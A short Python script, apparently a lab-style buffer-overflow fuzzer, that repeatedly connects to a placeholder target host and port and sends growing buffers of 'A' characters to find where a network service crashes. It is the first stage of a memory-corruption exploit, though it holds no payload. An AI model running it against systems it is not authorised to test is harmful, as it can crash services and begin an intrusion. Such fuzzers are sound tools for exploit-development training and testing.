#!/usr/bin/python
#author: prorat
#twitter: @pr0rat

import socket
import time
import sys

size = 100

while(size < 2500):
    try:
        print("\nSending evil buffer with %s bytes" % size)
        buffer = "A" * size

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        s.connect(("TARGETIP", PORT))
        s.send(buffer)

        s.close()

        size +=100
        time.sleep(3)

    except:
        print("\nCould not connect!")
        sys.exit()